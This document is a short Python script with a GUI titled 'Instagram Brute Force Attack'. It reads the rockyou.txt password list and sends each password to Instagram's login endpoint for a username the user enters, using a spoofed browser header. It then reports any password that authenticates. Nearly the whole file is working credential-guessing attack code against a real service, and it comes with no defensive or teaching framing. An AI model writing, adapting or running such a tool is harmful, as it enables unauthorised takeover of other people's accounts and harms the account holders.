import PySimpleGUI as sg
import requests
import threading

sg.theme('DarkBlue3')

password_list = open("rockyou.txt", "r", encoding="utf-8").read().splitlines()

layout = [[sg.Text('Enter Instagram username:')],
          [sg.InputText()],
          [sg.Text('Brute force password:')],
          [sg.InputText(key='password')],
          [sg.Text('')],
          [sg.Button('Start'), sg.Exit()]]

window = sg.Window('Instagram Brute Force Attack', layout, finalize=True)

def bruteforce(username):
    for password in password_list:
        login_url = f'https://www.instagram.com/accounts/login/ajax/'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        data = {
            'username': username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false'}
        response = requests.post(login_url, headers=headers, data=data)
        if 'authenticated' in response.text:
            sg.popup(f'Password found: {password}')
            window.close()
            break

while True:
    event, values = window.read()

    if event == 'Start':
        username = values[0]
        threading.Thread(target=bruteforce, args=(username,)).start()

    elif event == sg.WIN_CLOSED or event == 'Exit':
        break

window.close()


